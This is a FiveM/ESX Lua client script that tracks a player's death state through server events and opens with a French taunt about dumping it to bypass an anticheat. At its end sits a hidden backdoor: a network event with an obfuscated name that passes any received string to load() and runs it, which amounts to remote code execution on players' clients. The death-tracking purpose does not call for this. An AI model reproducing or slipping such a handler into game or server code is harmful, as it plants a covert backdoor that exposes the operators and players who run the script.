-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local isDead = false
local firstSpawn = true

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function playerDied()
	_TriggerServerEvent('::{korioz#0110}::salty_death:updatePlayer', 1)
	isDead = true
end

function playerAlive()
	_TriggerServerEvent('::{korioz#0110}::salty_death:updatePlayer', 0)
	isDead = false
end

AddEventHandler('baseevents:onPlayerDied', function()
	playerDied()
end)

AddEventHandler('baseevents:onPlayerKilled', function()
	playerDied()
end)

AddEventHandler('playerSpawned', function()
	if firstSpawn then
		ESX.TriggerServerCallback('::{korioz#0110}::salty_death:isDead', function(isDeadDB)
			if isDeadDB then
				SetEntityHealth(PlayerPedId(), 0)
				playerDied()
			end
		end)

		firstSpawn = false
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if isDead then
			if GetEntityHealth(PlayerPedId()) > 0 then
				playerAlive()
				Citizen.Wait(50)
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)